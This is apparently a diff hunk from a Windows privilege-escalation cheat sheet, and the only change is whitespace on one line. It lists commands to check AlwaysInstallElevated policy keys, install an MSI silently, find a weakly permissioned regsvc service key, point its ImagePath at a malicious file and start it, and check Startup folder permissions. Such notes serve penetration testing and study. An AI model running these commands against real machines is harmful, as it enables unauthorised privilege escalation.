@@ -8,7 +8,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer
 reg query HKCU\Software\Policies\Microsoft\Windows\Installer  
 msiexec /quiet /qn /i <msi location>
 Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
-reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f
+reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f  
 sc start regsvc
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
